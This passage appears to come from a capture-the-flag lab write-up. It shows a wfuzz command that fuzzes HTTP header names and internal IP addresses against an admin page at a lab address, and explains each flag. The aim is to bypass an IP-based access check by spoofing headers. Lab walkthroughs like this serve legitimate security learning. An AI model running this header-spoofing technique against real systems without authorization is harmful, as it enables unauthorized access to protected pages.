We can use wfuzz to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from here. So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a 192.168.4.28 address. We can generate a list of every IP in that scope and use that. This is what our total command will look like: Command: wfuzz -c -w http-headers-fuzz.txt -w ip-192-168-4-0.txt --hs \"Header Missing\" --sc \"200\" -H \"FUZZ:FUZ2Z\" \"http://10.10.10.167/admin.php\"  A quick breakdown of the above command: -c will output with colors, I like colors. -w specifies a wordlist. --hs will hide responses of the type following it. In this case \"Header Missing\". --sc will show response codes of the type following it. In this case 200. -H specifies header parameters. FUZZ:FUZ2Z These are the two header parameters we are fuzzing. FUZZ is for the first wordlist specified. FUZ2Z is for the second word list specified. So we have something like this in the header of our request: \"Acces-Control-Allow-Origin:192.168.4.44\" http://10.10.10.167/admin.php Lastly, the target URL.
